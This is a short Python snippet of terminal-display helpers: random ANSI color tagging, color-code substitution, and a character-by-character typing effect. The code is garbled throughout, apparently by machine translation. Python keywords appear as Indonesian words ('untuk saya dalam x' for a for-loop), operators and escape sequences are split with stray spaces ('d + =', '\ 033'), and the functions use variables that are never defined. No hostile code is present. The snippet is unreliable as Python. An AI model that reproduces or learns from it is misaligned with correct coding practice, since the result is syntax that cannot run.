def acak (b):
    w = 'ahtdzjc'
    d = ''
    untuk saya dalam x:
        d + = '!' + w [random.randint (0, len (w) -1)] + i
    return cetak (d)


def cetak (b):
    w = 'ahtdzjc'
    untuk saya di w:
        j = w.index (i)
        x = x.replace ('!% s'% i, '\ 033 [% s; 1m'% str (31 + j))
    x + = '\ 033 [0m'
    x = x.replace ('! 0', '\ 033 [0m')
    sys.stdout.write (x + '\ n')


def jalan (z):
	untuk e in z + '\ n':
		sys.stdout.write (e)
		sys.stdout.flush ()
		time.sleep (00000.1)


